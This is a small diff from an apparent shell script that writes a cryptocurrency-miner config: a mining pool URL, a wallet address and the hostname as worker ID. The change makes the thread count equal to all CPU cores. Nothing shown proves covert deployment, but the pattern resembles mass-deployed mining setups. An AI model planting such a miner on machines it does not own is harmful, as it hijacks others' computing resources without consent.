@@ -94,7 +94,7 @@ chmod 755 config.cfg
 echo "pool
 http://aropool.com/
 47VJTSocAAVkfoJ2o2fW4bQiiukiiAFNvWPsCfgcWZ5FZthq7HJxBMHo9rRe8jvRfSireoZYLJGWY2GTaYWs4M54
-20
+`nproc`
 enhanced
 true
 `hostname`" > config.cfg
